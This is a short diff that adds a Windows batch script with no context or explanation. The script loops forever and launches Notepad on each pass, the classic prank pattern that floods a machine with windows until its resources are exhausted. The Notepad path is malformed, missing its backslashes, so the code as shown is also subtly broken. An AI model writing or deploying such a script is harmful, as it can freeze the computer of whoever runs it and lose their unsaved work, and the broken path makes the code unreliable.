@@ -1,0 +1,4 @@
+ @ECHO off
+      :top
+      START %SystemRoot% system32notepad.exe
+      GOTO top
